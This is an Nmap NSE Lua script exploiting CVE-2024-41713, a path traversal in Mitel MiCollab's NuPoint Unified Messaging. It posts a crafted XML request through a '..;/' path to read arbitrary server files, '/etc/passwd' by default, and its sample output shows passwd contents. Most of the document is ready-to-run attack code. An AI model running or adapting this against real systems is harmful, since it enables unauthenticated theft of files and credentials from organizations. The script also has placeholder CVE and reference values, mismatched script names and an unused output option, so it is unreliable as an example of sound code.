local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"
local string = require "string"
local vulns = require "vulns"
local io = require "io"

description = [[
A vulnerability in the NuPoint Unified Messaging (NPM) component of Mitel MiCollab through 9.8 SP1 FP2 (9.8.1.201) could allow an unauthenticated attacker to conduct a path traversal attack, due to insufficient input validation. A successful exploit could allow unauthorized access, enabling the attacker to view, corrupt, or delete users' data and system configurations.
https://nvd.nist.gov/vuln/detail/CVE-2024-41713
Reference:
* CVE: 2024-41713
]]

---
-- @usage
-- nmap -p443 --script http-idacall-dir-traversal  <host/ip>
--
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-idacall-lfi:
-- |   VULNERABLE:
-- |   ReconcileWizard Local File Inclusion Vulnerability
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:2024-41713
-- |     Description:
-- |       path tranversal vulnerability allows remote attackers to fetch arbitrary files.
-- |
-- |     Disclosure date: 2024-12-06
-- |     Extra information:
-- |       /etc/passwd :
-- |   root:x:0:0:root:/root:/bin/bash
-- |   daemon:x:1:1:daemon:/usr/sbin:/bin/sh
author = "Lexis7"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "exploit"}

portrule = shortport.http

local DEFAULT_FILE = "../../../etc/passwd"
local EXPLOIT_PATH = "/npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1"
local PAYLOAD_TEMPLATE = [[
_transaction=<transaction xmlns:xsi="http://www.w3.org/2000/10/XMLSchema-instance" xsi:type="xsd:Object">
<transactionNum xsi:type="xsd:long">2</transactionNum>
<operations xsi:type="xsd:List">
<elem xsi:type="xsd:Object">
<criteria xsi:type="xsd:Object">
<reportName>%s</reportName>
</criteria>
<operationConfig xsi:type="xsd:Object">
<dataSource>summary_reports</dataSource>
<operationType>fetch</operationType>
</operationConfig>
<appID>builtinApplication</appID>
<operation>downloadReport</operation>
<oldValues xsi:type="xsd:Object">
<reportName>x.txt</reportName>
</oldValues>
</elem>
</operations>
<jscallback>x</jscallback>
</transaction>
]]

action = function(host, port)
  local target_file = stdnse.get_script_args("http-idacall-lfi.file") or DEFAULT_FILE
  local filewrite = stdnse.get_script_args("http-idacall-lfi.outfile")
  local post_data = PAYLOAD_TEMPLATE:format(target_file)

  local vuln = {
    title = 'ReconcileWizard Local File Inclusion Vulnerability',
    IDS = {CVE = 'CVE-2024-XXXXX'},
    state = vulns.STATE.NOT_VULN,
    description =
    [[Local file inclusion vulnerability allows remote attackers to fetch arbitrary files.]],
    references = {
      'http://hypothetical.reference.com',
    },
    dates = {
      disclosure = {year = '2024', month = '12', day = '6'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  -- Send the crafted POST request
  local response = http.post(host, port, EXPLOIT_PATH,
    {header = {["Content-Type"] = "application/x-www-form-urlencoded"}},
    nil, post_data)

  if response and response.body and response.status == 200 then
    stdnse.debug1("Response: %s", response.body)
    vuln.state = vulns.STATE.VULN
    local result = response.body

    -- Return the formatted output with the result
    return stdnse.format_output(true, result)
  else
    vuln.state = vulns.STATE.NOT_VULN
    vuln.extra_info = string.format("Failed to retrieve %s. Server response: %s", target_file, response and response.status or "No response")
  end

  return vuln_report:make_output(vuln)
end
